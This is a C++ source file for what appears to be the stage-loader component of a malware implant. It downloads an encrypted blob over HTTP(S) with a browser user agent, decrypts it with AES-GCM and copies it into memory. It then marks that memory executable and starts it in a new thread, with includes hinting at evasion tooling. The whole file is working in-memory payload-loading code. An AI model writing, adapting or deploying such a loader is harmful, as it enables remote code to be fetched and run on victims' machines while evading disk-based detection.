#include "Stage.h"
#include "core/Transport.h"
#include "evasive/MemGuard.h"

#include <windows.h>
#include <bcrypt.h>
#include <winhttp.h>

#include <cstring>
#include <vector>

#pragma comment(lib, "bcrypt.lib")

namespace stage {

namespace {

bool aes_gcm_decrypt(const std::uint8_t* key, const std::uint8_t* iv, std::size_t iv_len,
                     const std::uint8_t* aad, std::uint32_t aad_len,
                     const std::uint8_t* tag, const std::uint8_t* cipher, std::uint8_t* plain,
                     std::uint32_t len) {
    BCRYPT_ALG_HANDLE h = nullptr;
    if (BCryptOpenAlgorithmProvider(&h, BCRYPT_AES_ALGORITHM, nullptr, 0) < 0) return false;
    BCRYPT_KEY_HANDLE kh = nullptr;
    bool ok = false;
    if (BCryptGenerateSymmetricKey(h, &kh, nullptr, 0, const_cast<PUCHAR>(key), 32, 0) >= 0) {
        UCHAR tag2[16] = {0};
        std::memcpy(tag2, tag, 16);
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
        BCRYPT_INIT_AUTH_MODE_INFO(info);
        info.pbAuthData = const_cast<PUCHAR>(aad);
        info.cbAuthData = aad_len;
        info.pbNonce = const_cast<PUCHAR>(iv);
        info.cbNonce = static_cast<ULONG>(iv_len);
        info.pbTag = tag2;
        info.cbTag = 16;
        ULONG got = 0;
        ok = BCryptDecrypt(kh, const_cast<PUCHAR>(cipher), len, &info, nullptr, 0,
                          plain, len, &got, 0) >= 0;
        BCryptDestroyKey(kh);
    }
    BCryptCloseAlgorithmProvider(h, 0);
    return ok;
}

void* download(std::string_view url, std::vector<std::uint8_t>& out) {
    out.clear();
    HINTERNET ses = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!ses) return nullptr;
    HINTERNET conn = nullptr, hreq = nullptr;
    void* ret = nullptr;
    BOOL secure = FALSE;
    DWORD avail = 0;

    std::wstring wurl(url.begin(), url.end());
    URL_COMPONENTS uc = {sizeof(uc)};
    wchar_t host[256] = {0}, path[2048] = {0};
    uc.lpszHostName = host; uc.dwHostNameLength = 256;
    uc.lpszUrlPath = path; uc.dwUrlPathLength = 2048;
    uc.nPort = 443; uc.dwSchemeLength = 0;
    if (!WinHttpCrackUrl(wurl.c_str(), 0, 0, &uc)) goto done;

    secure = uc.nScheme == INTERNET_SCHEME_HTTPS;
    conn = WinHttpConnect(ses, host, uc.nPort, 0);
    if (!conn) goto done;
    hreq = WinHttpOpenRequest(conn, L"GET", path, nullptr, WINHTTP_NO_REFERER,
                              WINHTTP_DEFAULT_ACCEPT_TYPES, secure ? WINHTTP_FLAG_SECURE : 0);
    if (!hreq) goto done;
    if (!WinHttpSendRequest(hreq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) goto done;
    if (!WinHttpReceiveResponse(hreq, nullptr)) goto done;

    do {
        avail = 0;
        WinHttpQueryDataAvailable(hreq, &avail);
        if (!avail) break;
        std::size_t old = out.size();
        out.resize(old + avail);
        DWORD got = 0;
        if (!WinHttpReadData(hreq, out.data() + old, avail, &got)) { out.resize(old); break; }
        out.resize(old + got);
    } while (avail > 0);
    if (!out.empty()) ret = out.data();

done:
    if (hreq) WinHttpCloseHandle(hreq);
    if (conn) WinHttpCloseHandle(conn);
    WinHttpCloseHandle(ses);
    return ret;
}

} // namespace

bool load_and_run(std::string_view url, const std::uint8_t key[32]) {
    std::vector<std::uint8_t> blob;
    if (!download(url, blob)) return false;
    if (blob.size() < 28) return false; // iv(12) + tag(16) + payload
    const std::uint8_t* iv = blob.data();
    const std::uint8_t* tag = blob.data() + 12;
    const std::uint8_t* cipher = blob.data() + 28;
    std::uint32_t len = static_cast<std::uint32_t>(blob.size() - 28);
    auto g = mg::alloc(len + 1);
    mg::unlock(g);
    if (!g.ptr) return false;
    if (!aes_gcm_decrypt(key, iv, 12, nullptr, 0, tag, cipher, static_cast<std::uint8_t*>(g.ptr), len)) {
        mg::free(g); return false;
    }
    static_cast<std::uint8_t*>(g.ptr)[len] = 0;
    void* mem = VirtualAlloc(nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { mg::free(g); return false; }
    std::memcpy(mem, g.ptr, len);
    DWORD old = 0;
    if (!VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old)) { VirtualFree(mem, 0, MEM_RELEASE); mg::free(g); return false; }
    mg::free(g);
    HANDLE th = CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(mem), nullptr, 0, nullptr);
    if (!th) { VirtualFree(mem, 0, MEM_RELEASE); return false; }
    CloseHandle(th);
    return true;
}

} // namespace stage
